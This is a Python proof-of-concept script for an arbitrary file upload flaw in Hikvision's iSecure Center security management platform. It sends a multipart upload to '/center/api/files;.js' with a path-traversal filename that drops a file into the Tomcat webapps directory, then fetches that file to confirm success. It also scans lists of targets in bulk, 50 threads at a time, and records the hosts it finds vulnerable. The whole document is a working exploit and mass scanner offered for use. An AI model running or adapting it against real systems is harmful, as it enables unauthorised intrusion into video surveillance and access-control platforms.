#海康威视isecure center 综合安防管理平台存在任意文件上传漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                             

"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="海康威视isecure center 综合安防管理平台存在任意文件上传漏洞")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/center/api/files;.js"
    headers = {
        'User-Agent': 'python-requests/2.26.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Content-Length': '257',
        'Content-Type': 'multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c',
    }
    data = "--ea26cdac4990498b32d7a95ce5a5135c\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt\"Content-Type: application/octet-stream\r\n\r\n332299402\r\n--ea26cdac4990498b32d7a95ce5a5135c--\r\n\r\n\r\n"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res1.status_code == 200 and 'data' in res1.text:
            res2 =requests.get(url=target+'/clusterMgr/153107606.txt;.js',verify=False,timeout=10)
            if res2.status_code == 200:
                print(f"[+]{target}存在任意文件上传漏洞")
                with open('result.txt','a')as f:
                    f.write(target+'\n')
        else:
            print(f"[-]{target}不存在任意文件上传漏洞")
    except Exception as e:
        print(f"Exception occurred: {e}")

if __name__ == "__main__":
    main()